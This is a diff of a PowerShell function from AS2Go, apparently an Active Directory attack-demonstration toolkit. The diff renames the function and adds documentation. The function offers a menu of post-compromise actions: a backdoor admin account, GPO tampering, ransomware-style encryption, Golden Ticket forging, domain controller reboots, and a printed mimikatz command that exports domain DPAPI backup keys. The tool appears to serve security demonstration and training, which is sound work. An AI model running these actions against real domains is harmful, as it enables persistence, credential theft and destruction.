@@ -1,4 +1,38 @@
-function Start-Phase12DomainCompromise {
+<#
+.SYNOPSIS
+Offers domain persistence, disruption, and demonstration-closing actions.
+
+.DESCRIPTION
+Presents a repeatable menu of final AS2Go actions and invokes the selected workflow after its confirmation steps.
+Options include creating an administrative backdoor user, modifying a selected GPO, removing privileged group
+memberships, disabling users or resetting passwords, and encrypting files through the ransomware demonstration.
+Other options export domain DPAPI backup keys, forge and inject a Golden Ticket, or restart configured victims.
+Exit invokes the demo-closing workflow. Unattended mode selects the backdoor step followed by the reboot step.
+
+.EXAMPLE
+Invoke-Phase12DomainCompromise
+Runs this workflow using the initialized AS2Go module configuration.
+
+.INPUTS
+None. This function does not declare pipeline input.
+
+.OUTPUTS
+Console messages and output from invoked commands; no dedicated result object is defined.
+
+.NOTES
+Private AS2Go function. Run from an initialized AS2Go module session.
+Available actions depend on initialized module settings, tools, modules, and current permissions.
+The default menu sequence does not execute every listed action automatically.
+
+.COMPONENT
+Category: Main Function
+
+.FUNCTIONALITY
+Offers a privileged backdoor account, GPO changes, group membership removal, and user disabling or password resets.
+Also offers file encryption, domain DPAPI backup-key export, and Golden Ticket creation and injection.
+Runs the selected workflow, restarts configured victim machines, or closes the AS2Go demonstration.
+#>
+function Invoke-Phase12DomainCompromise {
 
     ################################################################################
     #####                                                                      ##### 
@@ -22,7 +56,7 @@ function Start-Phase12DomainCompromise {
 
     Do {
 
-        Invoke-Output -Type Header -Message "Select a Final Action"
+        Write-AS2GoOutput -Type Header -Message "Select a Final Action"
 
         Write-Host "   B " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicBackdoor"
         Write-Host "   T " -ForegroundColor Yellow -NoNewline; Write-Host "- $topicGPT"
@@ -101,7 +135,8 @@ function Start-Phase12DomainCompromise {
 
             "B" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -Type  Header -M "Create a backdoor account with elevated group memberships for persistence"
+                Write-AS2GoOutput -Type  Header -M "Create a backdoor account with elevated group memberships for persistence"
+
         
                 If ($UnAttended) {
                     $answer = $Script:Yes 
@@ -119,7 +154,7 @@ function Start-Phase12DomainCompromise {
             }
             "P" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -Type  Header -M "Purge all privileged group memberships"
+                Write-AS2GoOutput -Type  Header -M "Purge all privileged group memberships"
                 $answer = $Script:Yes
                 
                 If ($UnAttended) {
@@ -135,7 +170,7 @@ function Start-Phase12DomainCompromise {
             }
             "T" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -Type  Header -M "Manipulate Group Policy Templates (GPT) files"
+                Write-AS2GoOutput -Type  Header -M "Manipulate Group Policy Templates (GPT) files"
         
                 If ($UnAttended) {
                     $answer = $Script:Yes 
@@ -154,7 +189,7 @@ function Start-Phase12DomainCompromise {
 
                     
                     if ([string]::IsNullOrEmpty($TargetGPO)) {
-                        Invoke-Output -Type CodeSnippet -Message "Domain Selection cancled by user"
+                        Write-AS2GoOutput -Type CodeSnippet -Message "Domain Selection cancled by user"
                     }
                     else {
                         New-GPOManipulation -ID $TargetGPO.ID.Guid -name $TargetGPO.DisplayName -domainDNS $TargetGPO.DomainDNS -server $TargetGPO.Server
@@ -165,7 +200,7 @@ function Start-Phase12DomainCompromise {
             }
             "U" {
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -Type  Header -M "Disable user accounts or/and enforce password resets"
+                Write-AS2GoOutput -Type  Header -M "Disable user accounts or/and enforce password resets"
       
                 $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
                 $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
@@ -194,10 +229,10 @@ function Start-Phase12DomainCompromise {
             "G" {
                 If (-not $SkipClearHost) { Clear-Host }
 
-                Invoke-Output -Type  Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
-                Invoke-Output -Type  Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
-                Invoke-Output -Type  Bullet -M "Step 2: Forge Golden Ticket"
-                Invoke-Output -Type  Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
+                Write-AS2GoOutput -Type  Header -M "Forge a Golden Ticket to achieve unrestricted Kerberos dominance"
+                Write-AS2GoOutput -Type  Bullet -M "Step 1: Dump the NTLM Hash for 'krbtgt' account"
+                Write-AS2GoOutput -Type  Bullet -M "Step 2: Forge Golden Ticket"
+                Write-AS2GoOutput -Type  Bullet -M "Step 3: Use the Golden Ticket to achieve unrestricted Kerberos dominance"
     
                 If ($UnAttended) {
                     $answer = $Script:No 
@@ -215,7 +250,7 @@ function Start-Phase12DomainCompromise {
                 #region  Step - ran ransomware attack? 
                 #Pause
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -Type  Header -M "Encrypt critical Domain Controller assets for strategic leverage"
+                Write-AS2GoOutput -Type  Header -M "Encrypt critical Domain Controller assets for strategic leverage"
     
                 If ($UnAttended) {
                     $answer = $Script:Yes 
@@ -238,9 +273,9 @@ function Start-Phase12DomainCompromise {
 
                 If (-not $SkipClearHost) { Clear-Host }
 
-                Invoke-Output -Type  Header -M "Export DATA PROTECTION API master key"
-                Invoke-Output -Type  Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
-                Invoke-Output -Type CodeSnippet -Message "Command:"
+                Write-AS2GoOutput -Type  Header -M "Export DATA PROTECTION API master key"
+                Write-AS2GoOutput -Type  Bullet -M "Attackers can use the master key to decrypt ANY secret`n    protected by DPAPI on all domain-joined machines"
+                Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
 
                 Write-Highlight -Text ".\mimikatz.exe ", """cd $Script:DefautExfiltrationFolder"" ", """privilege::", "debug", """ ""lsadump::", "backupkeys ", "/system:", "$Script:ASDC.$Script:ASFQDN", " /export", """ ""exit"""  `
                     -Color $fgcC, $fgcV, $fgcF, $fgcV, $fgcF, $fgcV, $fgcS, $fgcV, $fgcS, $fgcF
@@ -254,7 +289,7 @@ function Start-Phase12DomainCompromise {
                 }
 
                 If ($answer -eq $Script:Yes) {
-                    Start-ExportDPAPIMasterKey
+                    Export-DPAPIMasterKey
                 }
 
                 $repeat = $Script:Yes      
@@ -262,7 +297,7 @@ function Start-Phase12DomainCompromise {
             "R" {
                 #Pause
                 If (-not $SkipClearHost) { Clear-Host }
-                Invoke-Output -Type  Header -M "Trigger coordinated reboot across accessible Domain Controllers"
+                Write-AS2GoOutput -Type  Header -M "Trigger coordinated reboot across accessible Domain Controllers"
                 Restart-VictimMachines
                 $repeat = $Script:Yes
             }
